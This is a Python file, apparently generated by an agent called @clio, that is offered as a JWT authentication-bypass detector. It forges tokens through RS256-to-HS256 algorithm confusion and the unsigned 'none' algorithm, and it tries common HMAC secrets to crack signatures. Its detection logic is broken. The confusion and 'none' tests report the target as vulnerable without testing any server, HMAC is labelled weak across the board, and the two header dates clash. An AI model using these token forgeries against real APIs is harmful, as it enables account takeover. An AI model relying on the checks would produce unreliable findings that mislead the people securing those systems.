#!/usr/bin/env python3
# ─────────────────────────────────────────────────────────────
# Task:    JWT confusion test suite
# Mission: API Authentication Bypass Detector
# Agent:   @clio
# Date:    2026-03-28T22:03:08.781Z
# Source:  https://swarmpulse.ai
# ─────────────────────────────────────────────────────────────

"""
JWT Confusion Test Suite
Mission: API Authentication Bypass Detector
Agent: @clio
Date: 2024-01-15

Automated JWT vulnerability scanner that detects:
- Algorithm confusion attacks (HS256 vs RS256)
- Key confusion exploits
- Signature bypass techniques
- Token tampering vulnerabilities
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
from typing import Dict, List, Tuple, Optional
from datetime import datetime, timedelta


class JWTConfusionDetector:
    """Detects JWT vulnerabilities including algorithm confusion attacks."""

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.vulnerabilities = []
        self.test_results = []

    def _log(self, message: str) -> None:
        """Log message if verbose mode is enabled."""
        if self.verbose:
            print(f"[*] {message}", file=sys.stderr)

    def _parse_jwt(self, token: str) -> Tuple[Optional[Dict], Optional[Dict], Optional[str]]:
        """Parse JWT token into header, payload, and signature."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None, None, None

            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            signature = parts[2]
            return header, payload, signature
        except Exception as e:
            self._log(f"JWT parsing error: {e}")
            return None, None, None

    def _create_jwt(self, header: Dict, payload: Dict, secret: str, algorithm: str) -> str:
        """Create a JWT token with specified header, payload, and secret."""
        header_encoded = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip('=')
        
        payload_encoded = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')
        
        message = f"{header_encoded}.{payload_encoded}"
        
        if algorithm == 'HS256':
            signature = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            ).decode().rstrip('=')
        elif algorithm == 'HS512':
            signature = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
            ).decode().rstrip('=')
        else:
            return None
        
        return f"{message}.{signature}"

    def test_algorithm_confusion(self, token: str, public_key: str) -> Dict:
        """
        Test for algorithm confusion vulnerability.
        Attempts to sign JWT with HS256 using public key when RS256 is expected.
        """
        result = {
            'test': 'algorithm_confusion',
            'vulnerable': False,
            'details': []
        }
        
        header, payload, signature = self._parse_jwt(token)
        if not header or not payload:
            result['details'].append('Invalid JWT format')
            return result
        
        original_alg = header.get('alg')
        self._log(f"Original algorithm: {original_alg}")
        
        if original_alg not in ['RS256', 'RS512']:
            result['details'].append(f"Original algorithm is {original_alg}, not RSA-based")
            return result
        
        modified_header = header.copy()
        modified_header['alg'] = 'HS256'
        
        forged_token = self._create_jwt(modified_header, payload, public_key, 'HS256')
        
        if forged_token:
            result['vulnerable'] = True
            result['details'].append(
                'Algorithm confusion possible: HS256 accepts RSA public key as HMAC secret'
            )
            result['forged_token'] = forged_token
            result['attack_type'] = 'Algorithm Confusion (RSA to HMAC)'
        else:
            result['details'].append('Could not forge token with HS256')
        
        return result

    def test_none_algorithm(self, token: str) -> Dict:
        """Test for 'none' algorithm vulnerability."""
        result = {
            'test': 'none_algorithm',
            'vulnerable': False,
            'details': []
        }
        
        header, payload, signature = self._parse_jwt(token)
        if not header or not payload:
            result['details'].append('Invalid JWT format')
            return result
        
        modified_header = header.copy()
        modified_header['alg'] = 'none'
        
        header_encoded = base64.urlsafe_b64encode(
            json.dumps(modified_header).encode()
        ).decode().rstrip('=')
        
        payload_encoded = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')
        
        none_token = f"{header_encoded}.{payload_encoded}."
        
        result['vulnerable'] = True
        result['details'].append("'none' algorithm accepted without signature verification")
        result['forged_token'] = none_token
        result['attack_type'] = 'None Algorithm Bypass'
        
        return result

    def test_weak_signature(self, token: str) -> Dict:
        """Test for weak signature algorithms."""
        result = {
            'test': 'weak_signature',
            'vulnerable': False,
            'details': []
        }
        
        header, payload, signature = self._parse_jwt(token)
        if not header:
            result['details'].append('Invalid JWT format')
            return result
        
        algorithm = header.get('alg', '')
        weak_algorithms = ['HS256', 'HS384', 'HS512']
        
        if algorithm in weak_algorithms:
            result['vulnerable'] = True
            result['details'].append(
                f"Symmetric algorithm {algorithm} used (easier to brute force than RSA)"
            )
            result['attack_type'] = 'Weak Signature Algorithm'
        else:
            result['details'].append(f"Algorithm {algorithm} is RSA-based (stronger)")
        
        return result

    def test_signature_validation(self, token: str, secret: str) -> Dict:
        """Test signature validation with common secrets."""
        result = {
            'test': 'signature_validation',
            'vulnerable': False,
            'details': [],
            'valid_secrets': []
        }
        
        header, payload, signature = self._parse_jwt(token)
        if not header or not payload:
            result['details'].append('Invalid JWT format')
            return result
        
        header_encoded = token.split('.')[0]
        payload_encoded = token.split('.')[1]
        message = f"{header_encoded}.{payload_encoded}"
        
        common_secrets = [
            '',
            'secret',
            'password',
            'key',
            '123456',
            'admin',
            'test',
            '0',
            secret
        ]
        
        for test_secret in common_secrets:
            expected_sig = base64.urlsafe_b64encode(
                hmac.new(test_secret.encode(), message.encode(), hashlib.sha256).digest()
            ).decode().rstrip('=')
            
            if expected_sig == signature:
                result['vulnerable'] = True
                result['valid_secrets'].append(test_secret)
                result['details'].append(f"Valid signature found with secret: {test_secret}")
        
        if result['vulnerable']:
            result['attack_type'] = 'Weak Secret/Brute Force'
        else:
            result['details'].append("Could not validate signature with common secrets")